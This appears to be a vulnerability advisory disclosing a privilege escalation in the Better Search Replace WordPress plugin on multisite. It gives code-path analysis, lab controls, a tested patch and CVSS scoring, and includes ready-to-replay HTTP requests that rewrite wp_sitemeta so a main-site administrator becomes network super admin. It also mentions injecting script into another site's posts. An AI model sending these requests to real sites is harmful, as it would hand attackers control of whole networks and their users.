# BSR-2026-01: On multisite, a main-site administrator can make themself network super admin by rewriting `wp_sitemeta`

- Product: Better Search Replace (https://wordpress.org/plugins/better-search-replace/); the plugin's readme links https://github.com/deliciousbrains/better-search-replace as its GitHub repository. I worked from the wordpress.org release and did not check whether that repository matches 1.4.11
- Affected: 1.4.11, the latest release on wordpress.org when checked on 2026-11-18. WordPress multisite only
- CVSS 3.1: 9.1 (Critical) `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
- Reporter: thientc (VinSOC)
- Vendor status: not reported to the vendor as of 2026-11-22
- CVE: requested from MITRE on 2026-11-22, pending

## Summary

On a multisite network, Better Search Replace lets anyone with `manage_options` on the main site run search/replace on every table in the database, including the network tables `wp_sitemeta`, `wp_users` and `wp_usermeta`. An administrator of the main site who is not a super admin can replace the login in the serialized `site_admins` value and become the network's super administrator. In my lab, one search/replace run on `wp_sitemeta` (search `super`, replace `mainadmin`) made the main-site administrator a super admin and dropped the original one.

## Details

1. `bsr_enabled_for_user()` (`better-search-replace.php:221`) checks `apply_filters( 'bsr_capability', 'manage_options' )`. On multisite a regular site Administrator holds `manage_options` on their own site. The 1.4 changelog entry (April 2022) says the default "has changed from install_plugins to manage_options for compatibility with DISALLOW_FILE_MODS". On multisite only super admins have `install_plugins`, so before 1.4 this tool was super-admin only.
2. The plugin's own AJAX route `tools.php?page=better-search-replace&bsr-ajax=process_search_replace` is accepted after a `bsr_ajax_nonce` check and `bsr_enabled_for_user()` (`includes/class-bsr-ajax.php:59-81`). The nonce is printed on the plugin's Tools page for that user.
3. `process_search_replace()` runs `parse_str()` on `bsr_data` and takes `select_tables`, `search_for` and `replace_with` from it (`includes/class-bsr-ajax.php:163-177`).
4. `srdb()` only checks `table_exists()` (`includes/class-bsr-db.php:204`, `:522-524`), which compares against `get_tables()`. On the main site of a network `get_tables()` returns `SHOW TABLES` (`includes/class-bsr-db.php:60-61`), so every subsite table and every network table is accepted. On a subsite it returns only that site's prefix (`:62-64`).
5. Rows are read (`:248-256`), values go through `recursive_unserialize_replace()`, which keeps serialized string lengths valid (`:314`), and changed rows are written with `UPDATE` (`:329-335`).

Because of step 5, replacing `super` with `mainadmin` inside `a:1:{i:0;s:5:"super";}` produces the valid `a:1:{i:0;s:9:"mainadmin";}`, and WordPress then reads `mainadmin` as the only super admin.

Preconditions: WordPress multisite; the plugin active on the main site (network-activated in my lab); the default `bsr_capability`; the attacker is an Administrator of the main site and is not already a super admin.

## PoC

Setup: WordPress 7.1.4 multisite (subdirectory install, two sites), PHP 8.3, MariaDB 11.8, Better Search Replace 1.4.11 network-activated. Test users:

```
user=super      blog=1 manage_options=1 manage_network_options=1 is_super_admin=1 roles=administrator
user=mainadmin  blog=1 manage_options=1 manage_network_options=0 is_super_admin=0 roles=administrator
user=site2      blog=2 manage_options=1 manage_network_options=0 is_super_admin=0 roles=administrator
```

1. Log in as `mainadmin` and open `/wp-admin/tools.php?page=better-search-replace`. The table list has 28 entries, among them `wp_sitemeta`, `wp_site`, `wp_blogs`, `wp_users`, `wp_usermeta` and all `wp_2_*` tables. Copy `bsr_ajax_nonce` from the page.
2. Send the first step, then the follow-up step the response asks for:

```http
POST /wp-admin/tools.php?page=better-search-replace&bsr-ajax=process_search_replace HTTP/1.1
Host: <host>
Cookie: <mainadmin session cookies>
Content-Type: application/x-www-form-urlencoded

bsr_step=0&bsr_page=0&bsr_ajax_nonce=<nonce>&bsr_data=select_tables%255B%255D%3Dwp_sitemeta%26search_for%3Dsuper%26replace_with%3Dmainadmin
```

```
{"step":1,"page":0,"percentage":"100%", ... "bsr_data":"select_tables%5B0%5D=wp_sitemeta&case_insensitive=off&replace_guids=off&dry_run=off&search_for=super&replace_with=mainadmin&completed_pages=1&total_pages=1"}
```

```http
POST /wp-admin/tools.php?page=better-search-replace&bsr-ajax=process_search_replace HTTP/1.1
Host: <host>
Cookie: <mainadmin session cookies>
Content-Type: application/x-www-form-urlencoded

bsr_step=1&bsr_page=0&bsr_ajax_nonce=<nonce>&bsr_data=select_tables%255B0%255D%3Dwp_sitemeta%26case_insensitive%3Doff%26replace_guids%3Doff%26dry_run%3Doff%26search_for%3Dsuper%26replace_with%3Dmainadmin%26completed_pages%3D1%26total_pages%3D1
```

```
{"step":"done","page":0,"percentage":"100%", ...}
```

State before and after, from WP-CLI and `get_site_option()`:

```
before:
  wp super-admin list        super
  wp_sitemeta site_admins    a:1:{i:0;s:5:"super";}
  is_super_admin             super=1  mainadmin=0
  wp_sitemeta admin_email    super@bsr.test
after:
  wp super-admin list        mainadmin
  wp_sitemeta site_admins    a:1:{i:0;s:9:"mainadmin";}
  is_super_admin             super=0  mainadmin=1
  wp_sitemeta admin_email    mainadmin@bsr.test
```

The network admin email changed too, because the search string also matched it.

Controls, run before the attack in each of three runs, each starting from the same database snapshot:

- `mainadmin` with an invalid nonce: the endpoint returned the Tools page HTML instead of JSON and `wp_sitemeta` was unchanged.
- A Subscriber: Tools page and endpoint both HTTP 403.
- `site2`, and also `super`, working from `/site2/`: the list shows only the 10 `wp_2_*` tables, and a request naming `wp_sitemeta` left `site_admins` unchanged. The table list follows the current site, not the user.
- `mainadmin` on `/site2/`, where they have no role: HTTP 403.

The attack succeeded in all three runs.

## Impact

A main-site administrator, a role that WordPress multisite deliberately keeps below network administration, can make themself super admin of the whole network. In the lab WordPress reported `mainadmin` as super admin after the run. I did not go on to use network-admin screens with that account, but a super admin can manage every site and user and install network-wide plugins.

The same table access lets this user change other sites' data directly. In a separate run, `mainadmin` used the main site's Tools page to replace a marker in a published post on the second site (`wp_2_posts`) with a `<script>` element, which was stored as is.

This needs a fairly specific role layout: a network where the main site has an Administrator who is not a super admin. That layout is supported and expected in WordPress, but it is not on every network.

The same root cause also lets a subsite administrator without `unfiltered_html` write raw script into posts on their own site. I am reporting that separately because the impact is lower.

## Suggested fix

On multisite, default `bsr_enabled_for_user()` to a network capability such as `manage_network_options`, and keep `manage_options` on single site. Limiting the main-site table list to `$wpdb->tables( 'blog' )` for users who are not super admins would close the network-table part on its own.

I tested the first change in the lab:

```diff
-		$cap = apply_filters( 'bsr_capability', 'manage_options' );
+		$default_cap = ( function_exists( 'is_multisite' ) && is_multisite() ) ? 'manage_network_options' : 'manage_options';
+		$cap = apply_filters( 'bsr_capability', $default_cap );
```

With the patch, the same `mainadmin` and `site2` sessions and nonces got HTTP 403 and nothing changed. `super` still completed replacements on `wp_2_posts` and on main-site `wp_posts`. After I put 1.4.11 back, the same requests worked again. I did not test the single-site path, which the patch leaves as it was.

## Affected versions

- Tested and affected: 1.4.11 (wordpress.org release).
- From the changelog the default capability changed in 1.4 (April 2022), so 1.4 through 1.4.11 probably behave the same. I did not test any release other than 1.4.11.
- Fixed in: no fixed release known.

Tested on 2026-11-03 on a local WordPress multisite lab with test accounts and synthetic data only; no live site was tested.

## Severity

CVSS 3.1 base score **9.1** (Critical): `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

- **AV:N** Two HTTP requests to the plugin's admin endpoint.
- **AC:L** One search/replace run; the nonce is on the attacker's own Tools page.
- **PR:H** Administrator of the main site.
- **UI:N** No other user is involved.
- **S:C** The vulnerable component is a single-site admin tool, and the attacker ends up with network-level authority over every site and user. If a reviewer treats the network as one security scope, `S:U` gives 7.2.
- **C:H / I:H / A:H** Follow from the super-admin role. I observed the role change, not later use of it.

## Credit

thientc (VinSOC)
